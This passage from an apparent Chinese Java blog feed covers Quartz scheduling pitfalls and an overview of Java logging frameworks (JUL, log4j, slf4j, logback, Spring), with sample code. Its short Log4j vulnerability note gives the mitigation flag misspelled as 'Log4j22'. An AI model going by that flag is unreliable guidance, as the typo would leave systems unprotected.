rel="noopener">^1</a><ul><li>增加配置<code>org.quartz.jobStore.acquireTriggersWithinLock=true</code>表示在拉取triggers的时候进行加锁</li></ul></li><li>如果两个trigger的间隔周期很短，比如都是1s执行一次，假设A任务很耗时，B任务很快。会出现A任何和B任务被调度到一个线程中了，从而导致B任务也被拖慢(会出现漏执行次数，也可能1s里面执行了多次)<ul><li>暂未细究原因，A/B任务的间隔周期大一点就很少出现</li></ul></li></ul><h3 id="quartz设置新增任务默认暂停"><a href="#quartz设置新增任务默认暂停" class="headerlink" title="quartz设置新增任务默认暂停"></a>quartz设置新增任务默认暂停</h3><ul><li>参考：<a href="https://blog.51cto.com/abcd/2478761" target="_blank" rel="noopener">https://blog.51cto.com/abcd/2478761</a></li><li>qrtz_paused_trigger_grps(sched_name, trigger_group)触发器组暂停表有两个字段<ul><li>在通过<code>scheduler.scheduleJob</code>创建或更新任务时都会读取此表，如果任务符合则不管原来状态为什么都会改成暂停。而业务需要新增时暂停，之后修改不改变任务的状态(如任务时运行中，修改后任务仍然为运行中)</li><li>可通过手动操作此表完成<ul><li>新增时默认创建qrtz_paused_trigger_grps，创建完之后再删除</li><li>修改时读取Tigger状态，如果是暂停则不操作，如果是运行则先删除qrtz_paused_trigger_grps之后，再修改Tigger，最后重新创建qrtz_paused_trigger_grps</li><li>quartz需要和此处操作数据库使用同一数据源(即将quartz使用应用数据源；否则执行scheduleJob时，quartz读取不到创建的临时暂停组)</li></ul></li><li>注意 qrtz_paused_trigger_grps此表示也是<code>MisfireHandler</code>线程检查到漏任务后判断是否需要暂停当前任务的依据</li></ul></li></ul><h3 id="会自动暂停任务"><a href="#会自动暂停任务" class="headerlink" title="会自动暂停任务"></a>会自动暂停任务</h3><ul><li>如果上一次job 执行未完成，下一次就不会执行了<ul><li>解决方法: 如job里面不能抛出异常</li></ul></li><li>如应用停止时间过长，导致任务有一次没有执行，那么应用重新启动时就回自动暂停<ul><li>原因时有一个<code>MisfireHandler.class</code>线程，会定时检查任务是否漏执行，如果漏执行了，再判断是否存在对应的暂停组，如果存在则会将此任务暂停</li><li>解决: 去掉无用的暂停组</li></ul></li><li>如果一个job执行很耗时，超过了定时间隔（如每1小时执行一次，但是每次执行超过了1小时），则有可能自动暂停<ul><li><a href="https://blog.51cto.com/u_15082395/4356459" target="_blank" rel="noopener">未遇到，参考摘录</a>；简单测试下来结果为：如果阻塞在执行任务时，当阻塞完成后，之前漏掉的执行次数会立刻执行</li><li>在耗时较长的任务调整为异步执行，job中只是组织数据，放入缓存，由另外一条线程从缓存中获取数据进行处理，如果另外一条线程还未处理完上一批次的数据，则下次job任务执行时不再向缓存中添加数据</li></ul></li></ul><hr><p>参考文章</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Quartz是OpenSymphony开源组织在Job scheduling领域又一个开源项目&lt;/li&gt;
&lt;li&gt;&lt;a href
      
    
    </summary>
    
      <category term="java" scheme="http://blog.aezo.cn/categories/java/"/>
    
    
      <category term="job" scheme="http://blog.aezo.cn/tags/job/"/>
    
  </entry>
  
  <entry>
    <title>Java日志相关框架</title>
    <link href="http://blog.aezo.cn/2021/12/14/java/log-arch/"/>
    <id>http://blog.aezo.cn/2021/12/14/java/log-arch/</id>
    <published>2021-12-14T13:39:00.000Z</published>
    <updated>2022-03-01T12:56:42.690Z</updated>
    
    <content type="html"><![CDATA[<h2 id="日志框架"><a href="#日志框架" class="headerlink" title="日志框架"></a>日志框架</h2><ul><li>日志框架一般分为编程API和日志打印实现。编程API为应用程序基于此API进行编程，如slf4j；打印实现为实现了上述API的模块进行日志打印到控制台或文件，如logback-classic</li><li>slf4j、jcl、jul、log4j1、log4j2、logback大总结：<a href="https://my.oschina.net/pingpangkuangmo/blog/410224" target="_blank" rel="noopener">https://my.oschina.net/pingpangkuangmo/blog/410224</a></li><li>logging: jdk自带logging</li><li>log4j1(log4j)<ul><li>log4j: log4j1的全部内容(org.apache.log4j.*)</li></ul></li><li>log4j2(org.apache.logging.log4j)<ul><li>log4j-api: log4j2定义的API</li><li>log4j-core: log4j2上述API的实现</li><li>log4j-1.2-api: log4j到log4j2的桥接包。具体说明参考log4j</li></ul></li><li>logback<ul><li>logback-core: logback的核心包</li><li>logback-classic: logback实现了slf4j的API</li></ul></li><li>commons-logging 为了实现日志统一<ul><li>commons-logging: commons-logging的原生全部内容</li><li>log4j-jcl: commons-logging到log4j2的桥梁</li><li>jcl-over-slf4j: commons-logging到slf4j的桥梁</li></ul></li><li>slf4j 为了实现日志统一<ul><li>slf4j-api: 为日志接口，简称slf4j</li><li>slf4j转向某个实际的日志框架：如使用slf4j的API进行编程，底层想使用log4j1来进行实际的日志输出，可使用slf4j-log4j12进行桥接<ul><li>logback-classic: slf4j到logback的桥梁</li><li>log4j-slf4j-impl: slf4j到log4j2的桥梁(此时只需要log4j-api)</li><li>slf4j-jdk14: slf4j到jdk-logging的桥梁</li><li>slf4j-jcl: slf4j到commons-logging的桥梁</li><li>slf4j-log4j12: slf4j到log4j1的桥梁</li></ul></li><li>某个实际的日志框架转向slf4j(主要用来进行实际的日志框架之间的切换, slf4j为中间API)：如使用log4j1的API进行编程，但是想最终通过logback来进行输出，所以就需要先将log4j1的日志输出转交给slf4j来输出，slf4j再交给logback来输出。将log4j1的输出转给slf4j，这就是log4j-over-slf4j做的事<ul><li>log4j-to-slf4j: log4j2到slf4j的桥梁</li><li>jul-to-slf4j: jdk-logging到slf4j的桥梁</li><li>jcl-over-slf4j: commons-logging到slf4j的桥梁</li><li>log4j-over-slf4j: log4j1到slf4j的桥梁</li></ul></li></ul></li></ul><h2 id="jdk-logging"><a href="#jdk-logging" class="headerlink" title="jdk logging"></a>jdk logging</h2><ul><li>原理分析参考：<a href="https://blog.csdn.net/qingkangxu/article/details/7514770" target="_blank" rel="noopener">https://blog.csdn.net/qingkangxu/article/details/7514770</a></li><li>案例(/smjava/logging/log4j1-jdklog)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 打印日志如下，且IDEA显示为红色</span></span><br><span class="line"><span class="comment">* 十二月 10, 2021 9:13:04 下午 cn.aezo.logging.log4j1.App main</span></span><br><span class="line"><span class="comment">* 信息: jdk logging info...</span></span><br><span class="line"><span class="comment">* 十二月 10, 2021 9:13:04 下午 cn.aezo.logging.log4j1.App main</span></span><br><span class="line"><span class="comment">* 警告: jdk logging warning...</span></span><br><span class="line"><span class="comment">* 十二月 10, 2021 9:13:04 下午 cn.aezo.logging.log4j1.App main</span></span><br><span class="line"><span class="comment">* 严重: jdk logging severe...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// java.util.logging.Logger</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = Logger.getLogger(App.class.getName());</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    logger.info(<span class="string">"jdk logging info..."</span>);</span><br><span class="line">    logger.warning(<span class="string">"jdk logging warning..."</span>);</span><br><span class="line">    logger.severe(<span class="string">"jdk logging severe..."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="commons-logging"><a href="#commons-logging" class="headerlink" title="commons-logging"></a>commons-logging</h2><ul><li><a href="https://commons.apache.org/proper/commons-logging/" target="_blank" rel="noopener">commons-logging</a>: Jakarta Commons-logging（JCL）是apache最早提供的日志的门面接口。提供简单的日志实现以及日志解耦功能</li><li>JCL能够选择使用Log4j（或其他如slf4j等）还是JDK Logging，但是他不依赖Log4j，JDK Logging的API。如果项目的classpath中包含了log4j的类库，就会使用log4j，否则就使用JDK Logging</li><li>配置文件<code>commons-logging.properties</code>，包<code>org.apache.commons.logging.*</code></li><li>最后更新为2014年的v1.2</li><li>使用如</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h2><ul><li><a href="https://logging.apache.org/log4j/1.2/" target="_blank" rel="noopener">log4j1.x</a> 采用同步的方式打印log，当项目中打印log的地方很多的时候，频繁的加锁拆锁会导致性能的明显下降<ul><li>主要类<ul><li>LogManager: 它的类加载会创建logger仓库Hierarchy，并尝试寻找类路径下的配置文件，如果有则解析</li><li>Hierarchy: 包含三个重要属性<ul><li>LoggerFactory logger的创建工厂</li><li>Hashtable 用于存放上述工厂创建的logger</li><li>Logger root logger 用于承载解析文件的结果，设置级别，同时存放appender</li></ul></li><li>PropertyConfigurator: 用于解析log4j.properties文件</li><li>Logger: 我们用来输出日志的对象</li></ul></li><li>log4j.properties配置参考：<a href="https://blog.csdn.net/niuch1029291561/article/details/80938095" target="_blank" rel="noopener">https://blog.csdn.net/niuch1029291561/article/details/80938095</a></li></ul></li><li><a href="https://logging.apache.org/log4j/2.x/" target="_blank" rel="noopener">log4j2.x</a> 则为异步打印<ul><li>log4j2与log4j1发生了很大的变化，不兼容。log4j1仅仅作为一个实际的日志框架，slf4j、commons-logging作为门面，统一各种日志框架的混乱格局，现在log4j2也想跳出来充当门面了，也想统一大家了</li><li>log4j2包含<ul><li>log4j-api: 作为日志接口层，用于统一底层日志系统</li><li>log4j-core: 作为上述日志接口的实现，是一个实际的日志框架</li></ul></li><li>主要类说明<ul><li>LogManager: 它的类加载会去寻找LoggerContextFactory接口的底层实现，会从jar包中的配置文件中寻找</li><li>LoggerContextFactory: 用于创建LoggerContext，不同的日志实现系统会有不同的实现，如log4j-core中的实现为Log4jContextFactory</li><li>PropertyConfigurator: 用于解析log4j.properties文件</li><li>LoggerContext: 它包含了配置信息，并能创建log4j-api定义的Logger接口实例，并缓存这些实例</li><li>ConfigurationFactory: 上述LoggerContext解析配置文件，需要用到ConfigurationFactory，目前有三个- YamlConfigurationFactory、JsonConfigurationFactory、XmlConfigurationFactory，分别解析yuml json xml形式的配置文件</li></ul></li><li>log4j2.xml配置参考：<a href="https://www.jianshu.com/p/bfc182ee33db" target="_blank" rel="noopener">https://www.jianshu.com/p/bfc182ee33db</a></li><li>调试log4j2，增加jvm参数<code>-Dlog4j2.debug=true</code></li></ul></li><li>log4j1升级到log4j2<ul><li>删除原来log4j1依赖<code>log4j:log4j</code></li><li>增加新的log4j2依赖<code>org.apache.logging.log4j:log4j-api</code>和<code>org.apache.logging.log4j:log4j-core</code></li><li>增加<code>org.apache.logging.log4j:log4j-1.2-api</code>的桥接包，为官方推出的平稳的过度包。此时编程任然是基于log4j1进行编程<ul><li>桥接包的原理就是复写了log4j-1.2.17相关的类，再输出日志的时候调用的是log4j2中的方法</li><li>如：log4j1中使用Logger.getLogger(Test.class)获取日志对象，log4j2的Logger没有此方法，所以升级的时候可能出现需要更改代码。如果引入此包，可以实现不更改代码升级</li></ul></li><li>配置文件还是必须为log4j2.xml，而不能是log4j.properties或log4j.xml</li></ul></li><li>log4j漏洞<ul><li>发生版本 log4j 2.x &lt; 2.15.0-rc2</li><li>详情：<a href="https://help.aliyun.com/noticelist/articleid/1060971232.html" target="_blank" rel="noopener">https://help.aliyun.com/noticelist/articleid/1060971232.html</a></li><li>解决方案<ul><li>简单方案：<code>-DLog4j22.formatMsgNoLookups=true</code></li></ul></li><li>检测工具：<a href="https://github.com/webraybtl/Log4j" target="_blank" rel="noopener">https://github.com/webraybtl/Log4j</a></li></ul></li><li>log4j1案例(/smjava/logging/log4j1-jdklog)<ul><li>引入依赖<code>log4j:log4j:1.2.17</code></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 无 log4j.properties 文件时打印如下：</span></span><br><span class="line"><span class="comment">* log4j:WARN No appenders could be found for logger (cn.aezo.logging.log4j1.Log4j1App).</span></span><br><span class="line"><span class="comment">* log4j:WARN Please initialize the log4j system properly.</span></span><br><span class="line"><span class="comment">* log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more info.</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* 有 log4j.properties 文件之后打印如下：</span></span><br><span class="line"><span class="comment">* 2021-12-10 21:34:01 log4j debug message</span></span><br><span class="line"><span class="comment">* 2021-12-10 21:34:01 log4j info message</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// org.apache.log4j.Logger</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = Logger.getLogger(Log4j1App.class);</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(logger.isTraceEnabled())&#123;</span><br><span class="line">        logger.debug(<span class="string">"log4j trace message"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(logger.isDebugEnabled())&#123;</span><br><span class="line">        logger.debug(<span class="string">"log4j debug message"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(logger.isInfoEnabled())&#123;</span><br><span class="line">        logger.debug(<span class="string">"log4j info message"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// log4j.properties(也支持log4j.xml)。配置参考：https://blog.csdn.net/niuch1029291561/article/details/80938095</span></span><br><span class="line">log4j.rootLogger = debug, console</span><br><span class="line">log4j.appender.console = org.apache.log4j.ConsoleAppender</span><br><span class="line">log4j.appender.console.layout = org.apache.log4j.PatternLayout</span><br><span class="line">log4j.appender.console.layout.ConversionPattern = %-d&#123;yyyy-MM-dd HH:mm:ss&#125; %m%n</span><br></pre></td></tr></table></figure><ul><li>log4j2案例(/smjava/logging/log4j2)<ul><li>引入依赖<code>org.apache.logging.log4j:log4j-api:2.15.0</code>和<code>org.apache.logging.log4j:log4j-core:2.15.0</code></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 无 log4j2.xml 文件时无任何信息打印</span></span><br><span class="line"><span class="comment">* 有 log4j2.xml 文件之后打印如下：</span></span><br><span class="line"><span class="comment">* 21:52:05.789 [main] DEBUG cn.aezo.logging.log4j2.Log4j2App - log4j debug message</span></span><br><span class="line"><span class="comment">* 21:52:05.794 [main] DEBUG cn.aezo.logging.log4j2.Log4j2App - log4j info message</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// org.apache.logging.log4j.Logger org.apache.logging.log4j.LogManager</span></span><br><span class="line"><span class="comment">// 和log4j1是不同的，此时Logger是log4j-api中定义的接口，而log4j1中的Logger则是类</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Log4j2App.class);</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(logger.isTraceEnabled())&#123;</span><br><span class="line">        logger.debug(<span class="string">"log4j trace message"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(logger.isDebugEnabled())&#123;</span><br><span class="line">        logger.debug(<span class="string">"log4j debug message"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(logger.isInfoEnabled())&#123;</span><br><span class="line">        logger.debug(<span class="string">"log4j info message"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="slf4j"><a href="#slf4j" class="headerlink" title="slf4j"></a>slf4j</h2><ul><li><a href="http://www.slf4j.org/" target="_blank" rel="noopener">slf4j</a>是门面模式的典型应用(门面模式：外部与一个子系统的通信必须通过一个统一的外观对象进行，使得子系统更易于使用)</li><li>slf4j(slf4j-api)、commons-logging均为日志接口，不提供日志的具体实现</li><li>slf4j-simple、logback都是slf4j的具体实现；log4j并不直接实现slf4j，但是有专门的一层桥接slf4j-log4j12来实现slf4j</li><li><p>案例</p><ul><li>引入<code>org.slf4j:slf4j-api:1.7.25</code>(日志实现需额外引入)</li><li><p>使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过门面方法获取具体得实现，核心逻辑也是从此处开始的(从classpath下去找org/slf4j/impl/StaticLoggerBinder.class)</span></span><br><span class="line">Logger logger = LoggerFactory.getLogger(Object.class);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>如果不引入日志实现则会提示</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SLF4J: Failed to load class <span class="string">"org.slf4j.impl.StaticLoggerBinder"</span>.</span><br><span class="line">SLF4J: Defaulting to no-operation (NOP) logger implementation</span><br><span class="line">SLF4J: See http://www.slf4j.org/codes.html<span class="comment">#StaticLoggerBinder for further details.</span></span><br></pre></td></tr></table></figure><ul><li>如果引入多个日志实现(如logback-classic等)则会提示</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SLF4J: Class path contains multiple SLF4J bindings.</span><br><span class="line">SLF4J: Found binding <span class="keyword">in</span> [jar:file:/Users/smalle/.m2/repository/ch/qos/logback/logback-classic/1.2.3/logback-classic-1.2.3.jar!/org/slf4j/impl/StaticLoggerBinder.class]</span><br><span class="line">SLF4J: Found binding <span class="keyword">in</span> [jar:file:/Users/smalle/.m2/repository/org/apache/logging/log4j/log4j-slf4j-impl/2.10.0/log4j-slf4j-impl-2.10.0.jar!/org/slf4j/impl/StaticLoggerBinder.class]</span><br><span class="line">SLF4J: See http://www.slf4j.org/codes.html<span class="comment">#multiple_bindings for an explanation.</span></span><br><span class="line">SLF4J: Actual binding is of <span class="built_in">type</span> [ch.qos.logback.classic.util.ContextSelectorStaticBinder]</span><br></pre></td></tr></table></figure><h2 id="logback"><a href="#logback" class="headerlink" title="logback"></a>logback</h2><ul><li><a href="https://logback.qos.ch/" target="_blank" rel="noopener">官网</a></li><li>logback内置日志颜色：<a href="https://logback.qos.ch/manual/layouts.html#coloring" target="_blank" rel="noopener">https://logback.qos.ch/manual/layouts.html#coloring</a><ul><li>支持的颜色字符编码：%black 黑色、%red 红色、%green 绿色、%yellow 黄色、%blue 蓝色、%magenta 洋红色、%cyan 青色、%white 白色、%gray 灰色</li><li>对应加粗的颜色代码：%boldRed、%boldGreen、%boldYellow、%boldBlue、%boldMagenta、%boldCyan、%boldWhite、%highlight 高亮色</li><li>使用如：<code>%d{yyyy-MM-dd HH:mm:ss.SSS} %cyan([%thread]) %yellow(%-5level) %green(%logger{36}).%gray(%M)-%boldMagenta(%line) - %blue(%msg%n)</code></li><li>但是存在一个问题，控制台打印时info、error等不同级别显示的颜色是一致的，仅仅是%thread和%d这中日志字段的颜色不一致。可使用自定义日志颜色解决：<a href="https://blog.csdn.net/qq_31226223/article/details/82559355" target="_blank" rel="noopener">https://blog.csdn.net/qq_31226223/article/details/82559355</a><ul><li>如果是springboot项目，springboot提供了其自定义的日志颜色转换类，可以直接使用</li></ul></li></ul></li></ul><h2 id="spring-log"><a href="#spring-log" class="headerlink" title="spring log"></a>spring log</h2><ul><li>spring-core<ul><li><strong><code>org.springframework:spring-jcl</code></strong><ul><li><code>org.apache.logging.log4j:log4j-api[optional]</code></li><li><code>org.slf4j:slf4j-api[optional]</code></li></ul></li></ul></li><li>spring-boot-starter-logging(可看出springboot使用slf4j+logback进行日志输出)<ul><li><code>ch.qos.logback:logback-classic</code></li><li><code>org.apache.logging.log4j:log4j-to-slf4j</code> log4j2到slf4j的桥梁<ul><li>log4j-api</li><li>slf4j-api</li></ul></li><li><code>org.slf4j:jul-to-slf4j</code> jdk-logging到slf4j的桥梁</li></ul></li><li>spring-jcl<ul><li>包<code>org.apache.commons.logging.*</code>，和commons-logging包一样，是因为spring直接将commons-logging拷贝过来进行维护</li></ul></li><li>spring-jcl入口</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过此方法获取日志对象，实际调用 LogAdapter.createLog</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Log logger = LogFactory.getLog(App.class); <span class="comment">// org.apache.commons.logging.Log</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.commons.logging.LogAdapter</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">LogAdapter</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 默认使用java.util.logging日志框架</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> LogApi logApi = LogApi.JUL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据classpath下拥有的类名来判断具体使用的日志框架</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">ClassLoader cl = LogAdapter.class.getClassLoader();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Try Log4j 2.x API</span></span><br><span class="line">Class.forName(<span class="string">"org.apache.logging.log4j.spi.ExtendedLogger"</span>, <span class="keyword">false</span>, cl);</span><br><span class="line">logApi = LogApi.LOG4J;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ClassNotFoundException ex1) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Try SLF4J 1.7 SPI</span></span><br><span class="line">Class.forName(<span class="string">"org.slf4j.spi.LocationAwareLogger"</span>, <span class="keyword">false</span>, cl);</span><br><span class="line">logApi = LogApi.SLF4J_LAL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ClassNotFoundException ex2) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// Try SLF4J 1.7 API</span></span><br><span class="line">Class.forName(<span class="string">"org.slf4j.Logger"</span>, <span class="keyword">false</span>, cl);</span><br><span class="line">logApi = LogApi.SLF4J;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ClassNotFoundException ex3) &#123;</span><br><span class="line"><span class="comment">// Keep java.util.logging as default</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Log <span class="title">createLog</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (logApi) &#123;</span><br><span class="line">            <span class="keyword">case</span> LOG4J:</span><br><span class="line">                <span class="keyword">return</span> Log4jAdapter.createLog(name);</span><br><span class="line">            <span class="keyword">case</span> SLF4J_LAL:</span><br><span class="line">                <span class="keyword">return</span> Slf4jAdapter.createLocationAwareLog(name);</span><br><span class="line">            <span class="keyword">case</span> SLF4J:</span><br><span class="line">                <span class="keyword">return</span> Slf4jAdapter.createLog(name);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// Defensively use lazy-initializing adapter class here as well since the</span></span><br><span class="line">                <span class="comment">// java.logging module is not present by default on JDK 9. We are requiring</span></span><br><span class="line">                <span class="comment">// its presence if neither Log4j nor SLF4J is available; however, in the</span></span><br><span class="line">                <span class="comment">// case of Log4j or SLF4J, we are trying to prevent early initialization</span></span><br><span class="line">                <span class="comment">// of the JavaUtilLog adapter - e.g. by a JVM in debug mode - when eagerly</span></span><br><span class="line">                <span class="comment">// trying to parse the bytecode for all the cases of this switch clause.</span></span><br><span class="line">                <span class="keyword">return</span> JavaUtilAdapter.createLog(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">enum</span> LogApi &#123;LOG4J, SLF4J_LAL, SLF4J, JUL&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>springboot日志入口</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringApplication</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 实例化SpringApplication时，便会实例化Log</span></span><br><span class="line">    <span class="comment">// org.apache.commons.logging.LogFactory(通过spring-jcl获取日志对象)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Log logger = LogFactory.getLog(SpringApplication.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;日志框架&quot;&gt;&lt;a href=&quot;#日志框架&quot; class=&quot;headerlink&quot; title=&quot;日志框架&quot;&gt;&lt;/a&gt;日志框架&lt;/h2&gt;&lt;ul&gt;
